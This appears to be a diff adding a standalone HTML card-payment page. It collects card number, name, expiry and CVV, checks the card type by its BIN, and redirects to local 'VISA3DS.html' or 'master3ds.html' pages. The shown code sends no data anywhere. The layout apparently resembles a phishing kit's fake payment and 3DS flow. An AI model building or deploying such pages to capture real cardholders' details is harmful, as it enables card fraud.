@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Payment Page</title>
+<style>
+  /* ... styles unchanged ... */
+  body {
+    font-family: 'Segoe UI', sans-serif;
+    background: linear-gradient(135deg, #1f1c2c, #928DAB);
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    margin: 0;
+    position: relative;
+  }
+
+  .container {
+    background: rgba(255, 255, 255, 0.1);
+    padding: 30px 32px;
+    border-radius: 20px;
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+    backdrop-filter: blur(15px);
+    -webkit-backdrop-filter: blur(15px);
+    width: 320px;
+    text-align: center;
+    color: white;
+    animation: fadeIn 0.8s ease-in-out;
+    z-index: 1;
+  }
+
+  h2 {
+    margin-bottom: 20px;
+    font-size: 1.5rem;
+    font-weight: 600;
+  }
+
+  p {
+    font-size: 1.2rem;
+    margin-bottom: 20px;
+  }
+
+  form {
+    text-align: left;
+  }
+
+  label {
+    display: block;
+    margin-bottom: 8px;
+    font-size: 0.9rem;
+    color: rgba(255 255 255 / 0.85);
+    font-weight: 500;
+  }
+
+  input[type="text"],
+  input[type="number"] {
+    width: 100%;
+    padding: 14px 16px;
+    margin-bottom: 20px;
+    border: none;
+    border-radius: 12px;
+    background: rgba(255 255 255 / 0.2);
+    color: white;
+    font-size: 1rem;
+    outline: none;
+    transition: background 0.3s ease;
+    box-sizing: border-box;
+  }
+
+  input.expiry-date {
+    letter-spacing: 3px; /* spacing for MM/YY */
+  }
+
+  input::placeholder {
+    color: rgba(255 255 255 / 0.7);
+  }
+
+  input:focus {
+    background: rgba(255 255 255 / 0.35);
+  }
+
+  .pay-btn {
+    background: linear-gradient(135deg, #00c6ff, #0072ff);
+    color: white;
+    border: none;
+    padding: 14px;
+    width: 100%;
+    font-size: 16px;
+    margin-top: 10px;
+    cursor: pointer;
+    border-radius: 12px;
+    transition: all 0.3s ease;
+  }
+
+  .pay-btn:hover {
+    transform: scale(1.05);
+    box-shadow: 0 6px 20px rgba(0, 114, 255, 0.4);
+  }
+
+  /* Loading Overlay Styles */
+  #loading {
+    display: none;
+    position: fixed;
+    inset: 0; /* top, right, bottom, left = 0 */
+    background: rgba(0,0,0,0.7);
+    z-index: 9999;
+    flex-direction: column;
+    justify-content: center;
+    align-items: center;
+    gap: 12px;
+  }
+
+  #loading img {
+    width: 80px;
+    height: 80px;
+  }
+
+  #loading p {
+    color: white;
+    font-size: 1.2rem;
+    font-weight: 600;
+  }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(10px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+</style>
+</head>
+<body>
+  <div class="container">
+    <h2>Payment</h2>
+    <p id="amountDisplay"></p>
+
+    <form id="cardForm" onsubmit="event.preventDefault(); redirectTo3DS();">
+      <label for="cardNumber">Card Number</label>
+      <input
+        type="text"
+        id="cardNumber"
+        name="cardNumber"
+        placeholder="1234 5678 9012 3456"
+        maxlength="19"
+        inputmode="numeric"
+        pattern="\d{13,19}"
+        required
+      />
+
+      <label for="cardName">Name on Card</label>
+      <input type="text" id="cardName" name="cardName" placeholder="John Doe" required />
+
+      <label for="expiryDate">Expiry Date (MM/YY)</label>
+      <input
+        type="text"
+        id="expiryDate"
+        name="expiryDate"
+        class="expiry-date"
+        placeholder="MM/YY"
+        maxlength="5"
+        pattern="^(0[1-9]|1[0-2])\/?([0-9]{2})$"
+        required
+        autocomplete="cc-exp"
+        inputmode="numeric"
+      />
+
+      <label for="cvv">CVV</label>
+      <input
+        type="number"
+        id="cvv"
+        name="cvv"
+        placeholder="123"
+        maxlength="3"
+        inputmode="numeric"
+        pattern="\d{3}"
+        required
+        oninput="if(this.value.length > 3) this.value = this.value.slice(0,3);"
+      />
+
+      <button type="submit" class="pay-btn" id="payBtn">Pay Now</button>
+    </form>
+  </div>
+
+  <!-- Loading Overlay -->
+  <div id="loading">
+    <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading">
+    <p>Processing</p>
+  </div>
+
+<script>
+  const urlParams = new URLSearchParams(window.location.search);
+  const amount = urlParams.get('amount');
+  document.getElementById('amountDisplay').innerText = `Amount: AED ${amount}`;
+
+  // Auto-add slash in expiry date field
+  const expiryInput = document.getElementById('expiryDate');
+  expiryInput.addEventListener('input', function(e) {
+    let value = this.value.replace(/\D/g, '');
+    if (value.length >= 3) {
+      value = value.slice(0,2) + '/' + value.slice(2,4);
+    }
+    this.value = value;
+  });
+
+  function redirectTo3DS() {
+    const form = document.getElementById('cardForm');
+    if (!form.checkValidity()) {
+      form.reportValidity();
+      return;
+    }
+    
+    // Validate expiry date format
+    const exp = expiryInput.value;
+    if (!/^(0[1-9]|1[0-2])\/([0-9]{2})$/.test(exp)) {
+      alert('Please enter a valid expiry date in MM/YY format.');
+      expiryInput.focus();
+      return;
+    }
+    const parts = exp.split('/');
+    const month = parseInt(parts[0], 10);
+    const year = parseInt(parts[1], 10) + 2000; // assuming 21st century
+
+    const now = new Date();
+    const currentYear = now.getFullYear();
+    const currentMonth = now.getMonth() + 1;
+
+    if (year < currentYear || (year === currentYear && month < currentMonth)) {
+      alert('Card expiry date cannot be in the past.');
+      expiryInput.focus();
+      return;
+    }
+
+    // BIN check (first 6 digits)
+    const cardNumber = document.getElementById('cardNumber').value.replace(/\s+/g, '');
+    if (cardNumber.length < 6) {
+      alert('Please enter at least the first 6 digits of the card number for BIN check.');
+      return;
+    }
+    const bin = cardNumber.slice(0,6);
+    // Parse BIN as number for some checks
+    const binNumber = parseInt(bin, 10);
+
+    // Visa check: first digit 4
+    const isVisa = bin.startsWith('4');
+
+    // Mastercard check:
+    // Mastercard ranges: 51-55, 2221-2720
+    const binFirstTwo = parseInt(bin.slice(0,2),10);
+    const binFirstFour = parseInt(bin.slice(0,4),10);
+
+    const isMastercard = 
+      (binFirstTwo >= 51 && binFirstTwo <= 55) || 
+      (binFirstFour >= 2221 && binFirstFour <= 2720);
+
+    if (!isVisa && !isMastercard) {
+      alert('Card is neither Visa nor Mastercard. Only Visa and Mastercard are accepted.');
+      return;
+    }
+
+    // Show loading overlay and hide pay button
+    document.getElementById('payBtn').style.display = 'none';
+    document.getElementById('loading').style.display = 'flex';
+
+    // Redirect based on card type after 2 seconds
+    setTimeout(() => {
+      if (isVisa) {
+        window.location.href = "VISA3DS.html";
+      } else if (isMastercard) {
+        window.location.href = "master3ds.html";
+      }
+    }, 2000);
+  }
+</script>
+</body>
+</html>
